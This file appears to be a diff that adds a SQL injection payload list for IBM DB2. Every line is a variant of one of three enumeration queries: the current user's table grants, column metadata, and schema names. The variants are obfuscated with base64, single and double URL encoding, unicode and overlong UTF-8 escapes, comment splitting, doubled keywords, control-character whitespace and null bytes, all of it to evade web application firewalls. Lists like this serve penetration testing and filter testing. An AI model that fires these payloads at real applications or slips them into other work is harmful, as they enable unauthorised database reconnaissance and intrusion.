+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+%00
+c2VsZWN0ICogZnJvbSBzeXNjYXQudGFiYXV0aCB3aGVyZSBncmFudGVlID0gY3VycmVudCB1c2VyOwo=
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee LIKE current user;
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2573%2579%2573%2563%2561%2574%252E%2574%2561%2562%2561%2575%2574%2568%2520%2577%2568%2565%2572%2565%2520%2567%2572%2561%256E%2574%2565%2565%2520%253D%2520%2563%2575%2572%2572%2565%256E%2574%2520%2575%2573%2565%2572%253B%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%73%79%73%63%61%74%2E%74%61%62%61%75%74%68%20%77%68%65%72%65%20%67%72%61%6E%74%65%65%20%3D%20%63%75%72%72%65%6E%74%20%75%73%65%72%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0063%u0061%u0074%u002E%u0074%u0061%u0062%u0061%u0075%u0074%u0068%u0020%u0077%u0068%u0065%u0072%u0065%u0020%u0067%u0072%u0061%u006E%u0074%u0065%u0065%u0020%u003D%u0020%u0063%u0075%u0072%u0072%u0065%u006E%u0074%u0020%u0075%u0073%u0065%u0072%u003B%u000A
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where granteeLIKEcurrent user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select /*!30830* from syscat.tabauth where grantee = current user;
+*/
+select /*!00000* from syscat.tabauth where grantee = current user;
+*/
+select * from syscat.tabauth where grantee = current user;
+
+SSELECTELECT * FRFROMOM syscat.tabauth WHEWHERERE grantee = current user;
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAsyscat%C0%AEtabauth%C0%AAwhere%C0%AAgrantee%C0%AA%C0%BF%C0%AAcurrent%C0%AAuser%C0%BB%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %s%y%s%c%a%t%.%t%a%b%a%u%t%h %w%h%e%r%e %g%r%a%n%t%e%e %= %c%u%r%r%e%n%t %u%s%e%r%;%
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+ and '0having'='0having'
+select * from syscat.tabauth where grantee = current user;
+-- sp_password
+select/**/*/**/from/**/syscat.tabauth/**/where/**/grantee/**/=/**/current/**/user;
+
+select--HPswzSrpW%0A*--MxCdQVjY%0Afrom--jdONjdbk%0Asyscat.tabauth--WwQiGHZYS%0Awhere--FpZuzrmEipex%0Agrantee--AMgRCgW%0A=--tQIDruKYlZeJ%0Acurrent--XvayUrl%0Auser;--bZXdCiAo%0A
+select%23iLCKWitEd%0A*%23TdmUgjnXnbuq%0Afrom%23CqPsCFSn%0Asyscat.tabauth%23YzQOgetGk%0Awhere%23PGcCgddaBpF%0Agrantee%23ZgyvkCpHqA%0A=%23qFyIRaTiLzs%0Acurrent%23pHOrkV%0Auser;%23gFfLVYG%0A
+select%23exoJfuD%0A*%23tIlAJw%0Afrom%23PvxjVb%0Asyscat.tabauth%23gDmdSACa%0Awhere%23wGpIUfKef%0Agrantee%23txDAmcqCy%0A=%23HbgkpSHEk%0Acurrent%23sNofOZvJQ%0Auser;%23IgPXEWPcM%0A
+select%07*%08from%0Asyscat.tabauth%03where%07grantee%0D=%07current%04user;
+
+select%23%0A*%23%0Afrom%23%0Asyscat.tabauth%23%0Awhere%23%0Agrantee%23%0A=%23%0Acurrent%23%0Auser;%23%0A
+select%0D*%0Cfrom%0Bsyscat.tabauth%0Dwhere%0Cgrantee%0D=%0Ccurrent%0Buser;
+
+select--%0A*--%0Afrom--%0Asyscat.tabauth--%0Awhere--%0Agrantee--%0A=--%0Acurrent--%0Auser;--%0A
+select+*+from+syscat.tabauth+where+grantee+=+current+user;
+
+select%0C*%0Cfrom%0Csyscat.tabauth%0Cwhere%0Cgrantee%09=%09current%0Cuser;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select * from syscat.tabauth where grantee = current user;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+%00
+c2VsZWN0IG5hbWUsIHRibmFtZSwgY29sdHlwZSBmcm9tIHN5c2libS5zeXNjb2x1bW5zOwo=
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+%2573%2565%256C%2565%2563%2574%2520%256E%2561%256D%2565%252C%2520%2574%2562%256E%2561%256D%2565%252C%2520%2563%256F%256C%2574%2579%2570%2565%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2563%256F%256C%2575%256D%256E%2573%253B%250A
+%73%65%6C%65%63%74%20%6E%61%6D%65%2C%20%74%62%6E%61%6D%65%2C%20%63%6F%6C%74%79%70%65%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%63%6F%6C%75%6D%6E%73%3B%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u006E%u0061%u006D%u0065%u002C%u0020%u0074%u0062%u006E%u0061%u006D%u0065%u002C%u0020%u0063%u006F%u006C%u0074%u0079%u0070%u0065%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0069%u0062%u006D%u002E%u0073%u0079%u0073%u0063%u006F%u006C%u0075%u006D%u006E%u0073%u003B%u000A
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select /*!30654name, tbname, coltype from sysibm.syscolumns;
+*/
+select /*!00000name, tbname, coltype from sysibm.syscolumns;
+*/
+select name, tbname, coltype from sysibm.syscolumns;
+
+SESELECTLECT name, tbname, coltype FROFROMM sysibm.syscolumns;
+
+select%C0%AAname%C0%AE%C0%AAtbname%C0%AE%C0%AAcoltype%C0%AAfrom%C0%AAsysibm%C0%AEsyscolumns%C0%BB%C0%8A
+%s%e%l%e%c%t %n%a%m%e%, %t%b%n%a%m%e%, %c%o%l%t%y%p%e %f%r%o%m %s%y%s%i%b%m%.%s%y%s%c%o%l%u%m%n%s%;%
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+ and '0having'='0having'
+select name, tbname, coltype from sysibm.syscolumns;
+-- sp_password
+select/**/name,/**/tbname,/**/coltype/**/from/**/sysibm.syscolumns;
+
+select--pGTrRCEbQMBW%0Aname,--MntQYUZsnFL%0Atbname,--CwJZNqay%0Acoltype--Vsvryw%0Afrom--NqFtqYYKZxuG%0Asysibm.syscolumns;--vyATYDNbRvYd%0A
+select%23ntiPyUVdaodI%0Aname,%23xQTBWTxjxZgm%0Atbname,%23pAfCDtLYIT%0Acoltype%23FigYoXEIAUVX%0Afrom%23zVGtPwvM%0Asysibm.syscolumns;%23bojOTDqk%0A
+select%23yeqyDi%0Aname,%23xhxnCruIsEc%0Atbname,%23XbROPPtZ%0Acoltype%23YxOXHTszvM%0Afrom%23vWZzWewcMm%0Asysibm.syscolumns;%23EjpKSuVIyp%0A
+select%0Ename,%01tbname,%0Dcoltype%04from%06sysibm.syscolumns;
+
+select%23%0Aname,%23%0Atbname,%23%0Acoltype%23%0Afrom%23%0Asysibm.syscolumns;%23%0A
+select%09name,%09tbname,%0Acoltype%0Dfrom%0Dsysibm.syscolumns;
+
+select--%0Aname,--%0Atbname,--%0Acoltype--%0Afrom--%0Asysibm.syscolumns;--%0A
+select+name,+tbname,+coltype+from+sysibm.syscolumns;
+
+select%0Dname,%0Dtbname,%09coltype%0Cfrom%0Asysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+select name, tbname, coltype from sysibm.syscolumns;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+%00
+U0VMRUNUIHNjaGVtYW5hbWUgRlJPTSBzeXNjYXQuc2NoZW1hdGE7Cg==
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+%2553%2545%254C%2545%2543%2554%2520%2573%2563%2568%2565%256D%2561%256E%2561%256D%2565%2520%2546%2552%254F%254D%2520%2573%2579%2573%2563%2561%2574%252E%2573%2563%2568%2565%256D%2561%2574%2561%253B%250A
+%53%45%4C%45%43%54%20%73%63%68%65%6D%61%6E%61%6D%65%20%46%52%4F%4D%20%73%79%73%63%61%74%2E%73%63%68%65%6D%61%74%61%3B%0A
+%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0073%u0063%u0068%u0065%u006D%u0061%u006E%u0061%u006D%u0065%u0020%u0046%u0052%u004F%u004D%u0020%u0073%u0079%u0073%u0063%u0061%u0074%u002E%u0073%u0063%u0068%u0065%u006D%u0061%u0074%u0061%u003B%u000A
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT /*!30399schemaname FROM syscat.schemata;
+*/
+SELECT /*!00000schemaname FROM syscat.schemata;
+*/
+SELECT schemaname FROM syscat.schemata;
+
+SELECSELECTT schemaname FRFROMOM syscat.schemata;
+
+SELECT%C0%AAschemaname%C0%AAFROM%C0%AAsyscat%C0%AEschemata%C0%BB%C0%8A
+%S%E%L%E%C%T %s%c%h%e%m%a%n%a%m%e %F%R%O%M %s%y%s%c%a%t%.%s%c%h%e%m%a%t%a%;%
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+ and '0having'='0having'
+SELECT schemaname FROM syscat.schemata;
+-- sp_password
+SELECT/**/schemaname/**/FROM/**/syscat.schemata;
+
+SELECT--YPvTTXGrZNO%0Aschemaname--uFHGNUsc%0AFROM--Knnzbw%0Asyscat.schemata;--MmwFrrFK%0A
+SELECT%23JbEMrhoqhkY%0Aschemaname%23zTvfmkkZz%0AFROM%23ICQtrEl%0Asyscat.schemata;%23qWyLNUOYKCU%0A
+SELECT%23tBwOCIuT%0Aschemaname%23DJaxRWgwbhE%0AFROM%23IhBNULH%0Asyscat.schemata;%23EuroErXb%0A
+SELECT%0Fschemaname%07FROM%03syscat.schemata;
+
+SELECT%23%0Aschemaname%23%0AFROM%23%0Asyscat.schemata;%23%0A
+SELECT%09schemaname%0AFROM%0Bsyscat.schemata;
+
+SELECT--%0Aschemaname--%0AFROM--%0Asyscat.schemata;--%0A
+SELECT+schemaname+FROM+syscat.schemata;
+
+SELECT%09schemaname%09FROM%0Asyscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
+SELECT schemaname FROM syscat.schemata;
+
